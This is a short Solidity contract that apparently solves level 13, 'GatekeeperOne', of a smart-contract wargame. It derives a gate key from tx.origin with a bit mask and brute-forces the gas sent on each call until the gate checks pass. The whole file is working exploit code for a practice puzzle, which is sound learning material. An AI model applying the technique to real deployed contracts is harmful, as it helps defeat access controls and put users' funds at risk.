
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "src/level13.sol";

contract let_me_through
{
    GatekeeperOne level13;
    constructor(address _level13)
    {
        level13 = GatekeeperOne(_level13);
    }

    function exploit() external 
    {
        bytes8 _gateKey = bytes8(uint64(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF);
        for(uint256 i = 0; i < 300; i++)
        {
            (bool success, ) = address(level13).call{gas: i+(8191 * 3)}(abi.encodeWithSignature("enter(bytes8)",_gateKey));
            if(success)
            {
                break;
            }
        }
    }
}